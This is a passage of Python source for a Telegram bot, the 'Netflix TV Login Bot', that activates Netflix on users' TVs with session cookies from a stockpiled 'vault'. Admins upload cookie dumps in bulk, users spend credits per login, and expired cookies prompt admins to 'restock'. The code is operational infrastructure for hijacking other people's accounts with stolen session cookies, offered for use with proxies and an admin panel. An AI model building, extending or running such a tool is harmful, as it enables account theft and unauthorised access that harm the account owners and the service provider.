    if result.get("success"):
        mark_successful_login(user.id)
        login_no = get_user_success_count(user.id)
        text = build_success_msg(tv_code, info_dict, result.get("cookie_source", "vault"), login_no)
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=after_login_kb())

    elif result.get("error") == "no_cookies":
        refund_credit(user.id)
        await status_msg.edit_text(
            "😔 <b>Vault Exhausted!</b>\n\n"
            "Ran out of cookies mid-process.\n"
            "Your credit has been <b>refunded</b>.\n\n"
            "Please try again after the admin restocks.",
            parse_mode=ParseMode.HTML,
            reply_markup=error_kb(),
        )

    elif result.get("error") == "all_dead":
        await status_msg.edit_text(
            "💀 <b>All Cookies Expired!</b>\n\n"
            "Checked all available cookies — none are working right now.\n"
            "Admin has been notified to restock.\n\n"
            "<i>Please try again in a while.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=error_kb(),
        )

    elif result.get("error") == "Invalid or expired TV code":
        with stats_lock:
            rt_stats["codes_rejected"] += 1
        await status_msg.edit_text(
            f"❌ <b>Invalid or Expired TV Code</b>\n\n"
            f"📺 Code: <code>{tv_code}</code>\n\n"
            f"The code you entered is wrong or has expired.\n"
            f"Please check your TV and enter a fresh code.\n\n"
            f"💡 <i>TV codes expire in ~15 minutes.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=error_kb(),
        )

    else:
        await status_msg.edit_text(
            f"❌ <b>Activation Failed</b>\n\n"
            f"📺 Code: <code>{tv_code}</code>\n"
            f"⚠️ Error: <i>{result.get('error', 'Unknown')}</i>\n\n"
            f"Please try again with a fresh code.\n"
            f"If the issue persists, contact support.",
            parse_mode=ParseMode.HTML,
            reply_markup=error_kb(),
        )


# ══════════════════════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ══════════════════════════════════════════════════════════════════════
async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q    = update.callback_query
    user = q.from_user
    await q.answer()

    if q.data == "back_start":
        ensure_user(user.id, user.first_name or "", user.username or "")
        credits_left, reset_in = get_credits_status(user.id)
        vault = count_vault()
        await q.edit_message_text(
            f"👋 <b>Hey {user.first_name}!</b>\n\n"
            f"🎬 <b>Netflix TV Login Bot</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Activate Netflix on your TV instantly.\n\n"
            f"💳 Credits: <b>{credits_bar(credits_left)} {credits_left}/{MAX_CREDITS}</b>\n"
            f"🍪 Vault: <b>{vault} cookies available</b>\n\n"
            f"<b>Usage:</b> /tv 1234-5678",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(),
        )

    elif q.data == "help_tv":
        await q.edit_message_text(
            "📺 <b>How to Get Your TV Code</b>\n\n"
            "1️⃣ Open <b>Netflix</b> on your TV / Smart TV\n"
            "2️⃣ Go to <b>Sign In</b>\n"
            "3️⃣ Select <b>'Use a Sign-In Code'</b>\n"
            "4️⃣ Note the <b>8-digit code</b> on screen\n"
            "5️⃣ Send it here:\n\n"
            "✅ <code>/tv 1234-5678</code>\n"
            "✅ <code>/tv 12345678</code>\n"
            "✅ <code>/tv 1234 5678</code>\n\n"
            "⏰ <i>Codes expire after ~15 minutes — use them fast!</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_kb(),
        )

    elif q.data == "my_credits":
        ensure_user(user.id)
        credits_left, reset_in = get_credits_status(user.id)
        row = get_user_row(user.id)
        reset_str = fmt_seconds(reset_in) if reset_in > 0 else "Available now ✅"
        await q.edit_message_text(
            f"💳 <b>Your Credits</b>\n\n"
            f"{credits_bar(credits_left)} <b>{credits_left}/{MAX_CREDITS}</b>\n\n"
            f"⏰ Resets in: <b>{reset_str}</b>\n"
            f"📺 Total logins: <b>{row.get('total_logins', 0)}</b>\n"
            f"✅ Successful: <b>{row.get('successful_logins', 0)}</b>\n\n"
            f"<i>Credits refill every {CREDIT_RESET_HRS} hours automatically.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_kb(),
        )

    elif q.data == "public_status":
        vault = count_vault()
        with stats_lock:
            success = rt_stats["successful"]
        await q.edit_message_text(
            f"📊 <b>Bot Status</b>\n\n"
            f"🟢 Status: <b>Online</b>\n"
            f"🍪 Cookies in vault: <b>{vault}</b>\n"
            f"✅ Successful logins: <b>{success}</b>\n\n"
            f"<i>Running smoothly!</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_kb(),
        )


# ══════════════════════════════════════════════════════════════════════
#  ADMIN — DIRECT FILE UPLOAD (just send .txt / .json / .zip to bot)
# ══════════════════════════════════════════════════════════════════════
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in ADMIN_IDS:
        return  # silently ignore from non-admins

    doc   = update.message.document
    fname = (doc.file_name or "").lower()

    if not fname.endswith((".txt", ".json", ".zip")):
        await update.message.reply_text(
            "❌ Only <b>.txt</b>, <b>.json</b>, or <b>.zip</b> accepted.",
            parse_mode=ParseMode.HTML,
        )
        return

    status_msg = await update.message.reply_text(
        "📥 <b>Downloading...</b>", parse_mode=ParseMode.HTML
    )

    try:
        file = await context.bot.get_file(doc.file_id)
        raw  = await file.download_as_bytearray()

        await status_msg.edit_text("⚙️ <b>Parsing cookies...</b>", parse_mode=ParseMode.HTML)

        added = skipped = 0

        if fname.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
                for name in zf.namelist():
                    if name.endswith("/") or name.startswith(("__MACOSX", ".")):
                        continue
                    if not name.lower().endswith((".txt", ".json")):
                        skipped += 1
                        continue
                    try:
                        content     = zf.read(name).decode("utf-8", errors="ignore")
                        found       = extract_all_cookies_from_content(content)
                        n           = store_cookies_bulk(found, source=os.path.basename(name))
                        added      += n
                        if n == 0:
                            skipped += 1
                    except Exception:
                        skipped += 1
        else:
            content = bytes(raw).decode("utf-8", errors="ignore")
            found   = extract_all_cookies_from_content(content)
            added   = store_cookies_bulk(found, source=doc.file_name)
            if added == 0:
                skipped = 1

        vault_count = count_vault()
        health = (
            "🟢 Vault is well stocked!" if vault_count > 200
            else "🟡 Vault is getting low." if vault_count > 30
            else "🔴 Vault is critically low!"
        )
        await status_msg.edit_text(
            f"✅ <b>Upload Complete!</b>\n\n"
            f"📥 Cookies added: <b>{added}</b>\n"
            f"⏭️ Skipped/invalid: <b>{skipped}</b>\n"
            f"🍪 Total in vault: <b>{vault_count}</b>\n\n"
            f"{health}",
            parse_mode=ParseMode.HTML,
        )

    except Exception as e:
        await status_msg.edit_text(
            f"❌ <b>Upload failed:</b> <code>{e}</code>",
            parse_mode=ParseMode.HTML,
        )


# ══════════════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════════════════

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/status — real-time admin panel."""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only.")
        return

    now   = time.time()
    vault = count_vault()

    with active_lock:
        a5m = sum(1 for t in active_users.values() if now - t <= 300)
        a1h = sum(1 for t in active_users.values() if now - t <= 3600)

    c = db()
    total_users   = c.execute("SELECT COUNT(*) AS n FROM users").fetchone()["n"]
    db_success    = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE success=1").fetchone()["n"]
    db_failed     = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE success=0").fetchone()["n"]
    cookies_used  = c.execute("SELECT COUNT(*) AS n FROM cookies WHERE used=1").fetchone()["n"]
    last_hr       = c.execute(
        "SELECT COUNT(*) AS n FROM login_log WHERE ts > strftime('%s','now','-1 hour')"
    ).fetchone()["n"]
    last_day      = c.execute(
        "SELECT COUNT(*) AS n FROM login_log WHERE ts > strftime('%s','now','-1 day')"
    ).fetchone()["n"]
    c.close()

    with stats_lock:
        uptime_since = rt_stats["started_at"]

    vault_health = (
        "🟢 Healthy"   if vault > 200
        else "🟡 Low"  if vault > 30
        else "🔴 Critical!"
    )

    await update.message.reply_text(
        f"📊 <b>Admin Status Panel</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🕐 <b>Now:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
        f"⏱️ <b>Bot started:</b> {uptime_since}\n\n"
        f"🍪 <b>VAULT</b>\n"
        f"   Available: <b>{vault}</b>  ({vault_health})\n"
        f"   Used so far: <b>{cookies_used}</b>\n\n"
        f"👥 <b>USERS</b>\n"
        f"   Total registered: <b>{total_users}</b>\n"
        f"   Active last 5 min: <b>{a5m}</b>\n"
        f"   Active last 1 hr: <b>{a1h}</b>\n\n"
        f"📈 <b>LOGINS</b>\n"
        f"   All-time successful: <b>{db_success}</b>\n"
        f"   All-time failed: <b>{db_failed}</b>\n"
        f"   Last 1 hour: <b>{last_hr}</b>\n"
        f"   Last 24 hours: <b>{last_day}</b>",
        parse_mode=ParseMode.HTML,
    )


async def cmd_addcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/addcredits USER_ID AMOUNT — give extra credits to a user."""
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addcredits USER_ID AMOUNT")
        return
    try:
        uid    = int(args[0])
        amount = int(args[1])
        c = db()
        c.execute(
            "UPDATE users SET credits_used=MAX(0, credits_used-?) WHERE user_id=?",
            (amount, uid),
        )
        c.commit()
        c.close()
        await update.message.reply_text(
            f"✅ Added <b>{amount}</b> credits to user <code>{uid}</code>.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def cmd_clearvault(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/clearvault — wipe all unused cookies."""
    if update.effective_user.id not in ADMIN_IDS:
        return
    c   = db()
    cur = c.cursor()
    cur.execute("DELETE FROM cookies WHERE used=0")
    deleted = cur.rowcount
    c.commit()
    c.close()
    await update.message.reply_text(
        f"🗑️ Cleared <b>{deleted}</b> unused cookies from vault.",
        parse_mode=ParseMode.HTML,
    )


async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/users — top 10 users by logins."""
    if update.effective_user.id not in ADMIN_IDS:
        return
    c    = db()
    rows = c.execute(
        "SELECT user_id, first_name, username, total_logins, successful_logins "
        "FROM users ORDER BY total_logins DESC LIMIT 10"
    ).fetchall()
    c.close()
    if not rows:
        await update.message.reply_text("No users yet.")
        return
    lines = ["👥 <b>Top 10 Users</b>\n"]
    for i, r in enumerate(rows, 1):
        name  = r["first_name"] or "Unknown"
        uname = f"@{r['username']}" if r["username"] else f"<code>{r['user_id']}</code>"
        lines.append(
            f"{i}. {name} ({uname}) — "
            f"<b>{r['successful_logins']}</b>✅ / {r['total_logins']} total"
        )
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/broadcast MESSAGE — send to all users."""
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast Your message here")
        return
    msg  = " ".join(context.args)
    c    = db()
    uids = [r["user_id"] for r in c.execute("SELECT user_id FROM users").fetchall()]
    c.close()
    sent = failed = 0
    for uid in uids:
        try:
            await context.bot.send_message(
                uid,
                f"📢 <b>Announcement</b>\n\n{msg}",
                parse_mode=ParseMode.HTML,
            )
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1
    await update.message.reply_text(
        f"📢 Broadcast done.\n✅ Sent: <b>{sent}</b>\n❌ Failed: <b>{failed}</b>",
        parse_mode=ParseMode.HTML,
    )


async def cmd_resetcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/resetcredits USER_ID — fully reset a user's credits."""
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not context.args:
        await update.message.reply_text("Usage: /resetcredits USER_ID")
        return
    try:
        uid = int(context.args[0])
        c   = db()
        c.execute("UPDATE users SET credits_used=0, last_reset=0 WHERE user_id=?", (uid,))
        c.commit()
        c.close()
        await update.message.reply_text(
            f"✅ Credits reset for <code>{uid}</code>.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════
def main():
    print("═" * 55)
    print("  Netflix TV Login Bot — Ultimate Edition v2.0")
    print("═" * 55)

    init_db()

    vault = count_vault()
    print(f"  Cookies in vault : {vault}")
    print(f"  Proxies loaded   : {len(proxies_list)}")
    print(f"  Admin IDs        : {ADMIN_IDS}")
    print(f"  Max credits      : {MAX_CREDITS} / {CREDIT_RESET_HRS}h")
    print()

    app = Application.builder().token(BOT_TOKEN).build()

    # User commands
    app.add_handler(CommandHandler("start",         cmd_start))
    app.add_handler(CommandHandler("tv",            cmd_tv))

    # Admin commands
    app.add_handler(CommandHandler("status",        cmd_status))
    app.add_handler(CommandHandler("addcredits",    cmd_addcredits))
    app.add_handler(CommandHandler("resetcredits",  cmd_resetcredits))
    app.add_handler(CommandHandler("clearvault",    cmd_clearvault))
    app.add_handler(CommandHandler("users",         cmd_users))
    app.add_handler(CommandHandler("broadcast",     cmd_broadcast))

    # Inline button callbacks
    app.add_handler(CallbackQueryHandler(cb_handler))

    # Admin direct cookie upload (just send the file, no command needed)
    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))

    print("  Bot is running! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  Stopped.")
        sys.exit(0)
